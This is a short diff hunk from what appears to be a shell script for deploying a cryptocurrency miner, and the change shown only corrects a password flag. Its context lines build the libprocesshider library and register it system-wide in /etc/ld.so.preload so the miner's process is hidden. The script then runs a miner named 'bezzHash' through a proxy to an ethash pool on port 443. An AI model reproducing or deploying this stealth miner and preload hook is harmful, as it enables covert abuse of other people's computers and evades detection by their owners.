@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=tcp://pukimeki.001@ethash.poolbinance.com:443 -pass 123456 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=tcp://pukimeki.001@ethash.poolbinance.com:443 --pass=123456 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
